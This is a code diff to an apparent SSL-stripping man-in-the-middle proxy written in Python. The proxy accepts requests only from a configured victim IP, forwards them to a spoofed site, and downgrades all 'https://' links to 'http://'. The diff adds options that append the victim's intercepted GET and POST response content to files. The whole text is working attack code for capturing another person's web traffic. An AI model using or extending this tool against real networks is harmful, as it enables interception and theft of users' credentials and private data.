@@ -7,6 +7,8 @@ import requests
 site_to_spoof = None
 ip_victim = None
 ip_attacker = None
+get_file = None
+post_file = None
 
 # Custom HTTP request handler that only allows requests from the victim.
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
@@ -49,7 +51,12 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
             # Replace all "https://" with "http://"
             try:
-                response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
+                decoded = response.content.decode('utf-8')
+                response_content = decoded.replace("https://", "http://").encode('utf-8')
+                # Save the response to a file
+                if get_file is not None:
+                    with open(get_file, 'a') as f:
+                        f.write(decoded)
             except UnicodeDecodeError:
                 response_content = response.content.replace(b"https://", b"http://")
 
@@ -95,12 +102,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
             # Replace all "https://" with "http://"
             try:
-                response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
-                print(response.content.decode('utf-8'))
+                decoded = response.content.decode('utf-8')
+                response_content = decoded.replace("https://", "http://").encode('utf-8')
+                # Save the response to a file
+                if post_file is not None:
+                    with open(post_file, 'a') as f:
+                        f.write(decoded)
             except UnicodeDecodeError:
                 response_content = response.content.replace(b"https://", b"http://")
-
-            print("COMPLETED POST")
 
             # Send the response back to the client
             self.send_response(response.status_code)
@@ -118,12 +127,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(b'403 Forbidden: Access denied')
 
 class Forwarder:
-    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
-        global ip_victim, site_to_spoof, ip_attacker
+    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_, get_file_, post_file_):
+        global ip_victim, site_to_spoof, ip_attacker, get_file, post_file
         self.interface = interface
         ip_attacker = ip_attacker_
         ip_victim = ip_victim_
         site_to_spoof = site_to_spoof_
+        get_file = get_file_
+        post_file = post_file_
 
     def forward(self):
         log_info("Starting packet forwarding")
